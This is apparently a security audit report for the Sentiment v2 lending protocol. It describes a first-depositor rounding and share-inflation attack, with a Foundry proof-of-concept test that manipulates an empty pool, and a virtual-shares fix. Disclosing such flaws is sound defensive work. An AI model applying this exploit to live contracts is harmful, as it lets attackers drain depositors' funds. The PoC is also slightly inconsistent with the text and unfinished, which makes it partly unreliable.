Rough Goldenrod Condor

High

# The Rounding Done in Protocol's Favor Can Be Weaponized to Drain the Protocol

## Summary
Empty pools' assets have been drained by the first depositor via inflating share prices.

## Vulnerability Detail

- **Empty Pool Condition:** The vulnerability occurs when the pool's total supply is zero.
- **Initial Deposit:** The attacker deposits 1000 wei worth of underlying assets. 
- **Borrowing:** The attacker borrows 1000 wei using the borrow function.
- **transfer amount** Position  manager mint  shares via transfer amount  
- **Partial Repayment:** Within the same block, the attacker repays 1000 wei. Due to rounding in favor of the protocol, total assets become 1001 wei, while the total supply remains 1000.
![image](https://github.com/user-attachments/assets/cb13b08c-8230-431f-bd15-edb89adad380)

- **Withdraw:** The attacker withdraws 999 wei, leaving the pool with a total supply of 1 and total assets of 2 wei.
![image](https://github.com/user-attachments/assets/7a4529d7-e948-446d-ab39-e8036323646e)

- **Inflation Attack:** The attacker repeatedly deposits and withdraws (total assets - 1) in the pool more than 80 times in a loop, leading to an inflated share price.

```solidity
 function testfirstdepositor() external {
    uint assets = 1000;
    vm.assume(assets > 0);
    vm.startPrank(user);

    asset1.mint(user, 1000e18);
    asset1.approve(address(pool), assets);

    pool.deposit(linearRatePool, 1000, user);
    assertEq(pool.getAssetsOf(linearRatePool, user), assets);
    assertEq(pool.balanceOf(user, linearRatePool), assets); // Shares equal 1:1 at first
    vm.stopPrank();

    vm.startPrank(registry.addressFor(SENTIMENT_POSITION_MANAGER_KEY));
    pool.borrow(linearRatePool, user, assets);
    vm.warp(block.timestamp + 10);
    vm.roll(block.number + 1 );
    asset1.mint(address(pool),1001);
    pool.repay(linearRatePool, user, assets + 1);


    vm.stopPrank();
    vm.startPrank(user);
    pool.withdraw(linearRatePool, 999 , user, user);


    asset1.mint(user, assets);
    asset1.approve(address(pool), 1000e18);

    uint256 n = 60;
    for(uint8 i = 0; i < n; i++){
        uint256 amount = i ** 2 + 1;
        pool.deposit(linearRatePool, amount , user);
    
        pool.withdraw(linearRatePool, 1 ,user,user);
        (,,,,,,,,,uint256 totalDepositAssets,uint256 totalDepositShares) = pool.poolDataFor(linearRatePool);
        require (totalDepositShares == 1, "should be one ");



    }
 
 
 
```


## Impact

The first depositor loses their funds as the attacker manipulates the share price to drain the pool's assets.

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L275

## Recommendation

Implement virtual shares or another mechanism to prevent rounding errors and price manipulation, especially when the pool is empty or has a very low total supply.
